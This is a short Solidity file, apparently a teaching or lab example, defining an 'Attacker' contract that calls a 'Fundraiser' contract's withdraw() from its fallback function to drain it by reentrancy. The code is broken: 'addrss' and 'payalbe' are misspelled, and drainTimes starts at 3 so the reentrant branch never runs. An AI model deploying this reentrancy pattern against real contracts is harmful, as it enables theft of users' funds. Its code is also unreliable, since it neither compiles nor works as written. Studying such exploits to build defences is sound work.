pragma solidity ^0.4.8;

import "./Fundraiser.sol";

contract Attacker {
  
  addrss public fundraiserAddress;
  uint public drainTimes = 3;
  
  function Attacker(address victimAddress) {
    fundraiserAddress = victimAddress;
  }
  
  function() payable {
    if(drainTimes < 3) {
      drainTimes ++;
      Fundraiser(fundraiserAddress).withdraw();
    }
  }
  
  function getFunds() returns (uint) {
    return address (this).balance;
  }
  
  function payMe() payalbe {
    Fundraiser(fundraiserAddress).contribute.value(msg.value)();
  }
  
  function startScam() {
    Fundraiser (fundraiserAddress).withdraw();
  }
}

